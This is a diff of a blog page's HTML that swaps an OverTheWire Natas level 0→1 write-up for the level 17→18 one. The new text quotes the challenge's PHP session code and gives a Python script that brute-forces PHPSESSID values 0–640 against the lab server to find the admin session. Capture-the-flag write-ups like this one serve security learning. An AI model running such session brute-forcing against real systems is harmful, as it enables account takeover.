@@ -6,31 +6,31 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <meta name="description" content="We'll I guess that secures things">
+    <meta name="description" content="Bill never said that!">
 
     <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.Cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
     <link rel="stylesheet" href="/assets/css/main.min.css ">
-    <link rel="canonical" href="/2021/05/23/natas00-01/">
+    <link rel="canonical" href="/2021/05/29/natas17-18/">
     <link rel="alternate" type="application/rss+xml" title="Caminek" href="/feed.xml ">
     
     <!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>Natas Level 0 → Level 1 | Caminek</title>
+<title>Natas Level 17 → Level 18 | Caminek</title>
 <meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="Natas Level 0 → Level 1" />
+<meta property="og:title" content="Natas Level 17 → Level 18" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="We’ll I guess that secures things" />
-<meta property="og:description" content="We’ll I guess that secures things" />
-<link rel="canonical" href="/2021/05/23/natas00-01/" />
-<meta property="og:url" content="/2021/05/23/natas00-01/" />
+<meta name="description" content="Bill never said that!" />
+<meta property="og:description" content="Bill never said that!" />
+<link rel="canonical" href="/2021/05/29/natas17-18/" />
+<meta property="og:url" content="/2021/05/29/natas17-18/" />
 <meta property="og:site_name" content="Caminek" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-05-23T15:04:25-04:00" />
+<meta property="article:published_time" content="2021-05-29T14:42:56-04:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Natas Level 0 → Level 1" />
+<meta property="twitter:title" content="Natas Level 17 → Level 18" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/23/natas00-01/"},"description":"We’ll I guess that secures things","headline":"Natas Level 0 → Level 1","dateModified":"2021-05-23T15:04:25-04:00","url":"/2021/05/23/natas00-01/","datePublished":"2021-05-23T15:04:25-04:00","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/29/natas17-18/"},"description":"Bill never said that!","headline":"Natas Level 17 → Level 18","dateModified":"2021-05-29T14:42:56-04:00","url":"/2021/05/29/natas17-18/","datePublished":"2021-05-29T14:42:56-04:00","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -142,11 +142,11 @@
 
         <div class="page clearfix" index>
     <div class="left">
-        <h1>Natas Level 0 → Level 1</h1>
+        <h1>Natas Level 17 → Level 18</h1>
         <div class="label">
 
             <div class="label-card">
-                <i class="fa fa-calendar"></i> 2021-05-23
+                <i class="fa fa-calendar"></i> 2021-05-29
             </div>
 
             <div class="label-card">
@@ -212,20 +212,91 @@
 <p>Excluding the URL and username, the Level Goal section is blank for the Natas ctf.</p>
 
 <h2 id="solution">Solution</h2>
-<p>Right clicking the webpage has been disabled. In Firefox, you can view the source using the following url:
-<a href="view-source:http://natas1.natas.labs.overthewire.org/">view-source:http://natas1.natas.labs.overthewire.org/</a></p>
+<p>The natas18 tells us to login to get the credentials for the next level. The form allows us to enter in a username and password. We can also view the source code.  Due to the length of the code, I’ll only included selected sections.</p>
 
-<p>The password is once again in a comment.</p>
+<p>First, the form does not allow the admin to log in.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;"&gt;
-&lt;h1&gt;natas1&lt;/h1&gt;
-&lt;div id="content"&gt;
-You can find the password for the
-next level on this page, but rightclicking has been blocked!
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span> 
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
+        <span class="c1">//return 1;</span>
+    <span class="p">}</span>
 
-&lt;!--The password for natas2 is Z------------------------------i --&gt;
-&lt;/div&gt;
-&lt;/body&gt;
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Second, the site uses PHPSESSID to track the user session.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">my_session_start</span><span class="p">()</span> <span class="p">{</span> 
+    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"PHPSESSID"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session start failed"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session start ok"</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session was old: admin flag set"</span><span class="p">);</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Third, the session id is between 1 and 640, inclusive.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nf">my_session_start</span><span class="p">())</span> <span class="p">{</span>
+    <span class="nf">print_credentials</span><span class="p">();</span>
+    <span class="nv">$showform</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"password"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">session_id</span><span class="p">(</span><span class="nf">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]));</span>
+    <span class="mf">...</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>
+</code></pre></div></div>
+
+<p>The one thing we don’t see is the password being used for anything. Enter in anything other than admin for the username and anything for the password, then click Login. Now open your browser’s Developer Tools (F12 in Firefox) and click on the Storage tab (again in Firefox) to view the value stored in PHPSESSID.</p>
+
+<p>If you were to delete this cookie, go back to main page for natas19 and enter the same information into the form, you’d get a different session id. This means that every user gets an random id between 1 and 640, including the admin. Since the search space is so small, we should be able to bruteforce the id fairly quickly.</p>
+
+<p>As we saw when we logged in, we’re greeted with, “You are logged in as a regular user” when we first logged in. While we can get the admin greeting from the source, we don’t need it. We’ll simply look for the absence of this line to let us know when we’ve found the correct id.</p>
+
+<p>You’ll need to add the current level password to the script. The script takes just over 4 seconds to run on my computer.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">import</span> <span class="nn">concurrent.futures</span>
+
+<span class="n">natas18_password</span> <span class="o">=</span> <span class="s">'x------------------------------P'</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">get_phpsessid</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://natas18.natas.labs.overthewire.org/index.php'</span><span class="p">,</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">"PHPSESSID"</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)},</span>
+                        <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'natas18'</span><span class="p">,</span> <span class="n">natas18_password</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="s">"You are logged in as a regular user"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'The admin id is </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">ThreadPoolExecutor</span><span class="p">()</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+    <span class="n">executor</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">get_phpsessid</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">641</span><span class="p">)))</span>
 </code></pre></div></div>
 
         </article>
@@ -235,12 +306,12 @@ next level on this page, but rightclicking has been blocked!
         <div class="post-recent">
     <div class="pre" style="display:inline-block; margin-top: 20px;">
         
-        <p><i class="fa fa-arrow-left"></i> <a href="/2021/05/23/natas00/">Natas Level 0</a></p>
+        <p><i class="fa fa-arrow-left"></i> <a href="/2021/05/28/natas16-17/">Natas Level 16 → Level 17</a></p>
         
     </div>
     <div class="nex" style="display:inline-block; margin-top: 20px; float:right;">
         
-        <p><a href="/2021/05/23/natas01-02/">Natas Level 1 → Level 2</a> <i class="fa fa-arrow-right"></i></p>
+        <p><a href="/2021/05/29/natas18-19/">Natas Level 18 → Level 19</a> <i class="fa fa-arrow-right"></i></p>
         
     </div>
 </div>
@@ -277,74 +348,6 @@ next level on this page, but rightclicking has been blocked!
                      <!--for loop is 0 based. this prevents off-by-one errors -->
                     
 
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
                     
                         
 
@@ -555,6 +558,74 @@ next level on this page, but rightclicking has been blocked!
 
                         
                     
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
                     
 
                     <!-- prevent Series from showing < 5 entries when near the start of series -->
@@ -567,7 +638,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas00/">Natas Level 0</a>
+                                    <a href="/2021/05/27/natas14-15/">Natas Level 14 → Level 15</a>
                                 
                             </li>
                         
@@ -575,7 +646,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <strong>Natas Level 0 → Level 1</strong>
+                                    <a href="/2021/05/28/natas15-16/">Natas Level 15 → Level 16</a>
                                 
                             </li>
                         
@@ -583,7 +654,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas01-02/">Natas Level 1 → Level 2</a>
+                                    <a href="/2021/05/28/natas16-17/">Natas Level 16 → Level 17</a>
                                 
                             </li>
                         
@@ -591,7 +662,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas02-03/">Natas Level 2 → Level 3</a>
+                                    <strong>Natas Level 17 → Level 18</strong>
                                 
                             </li>
                         
@@ -599,7 +670,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas03-04/">Natas Level 3 → Level 4</a>
+                                    <a href="/2021/05/29/natas18-19/">Natas Level 18 → Level 19</a>
                                 
                             </li>
                         
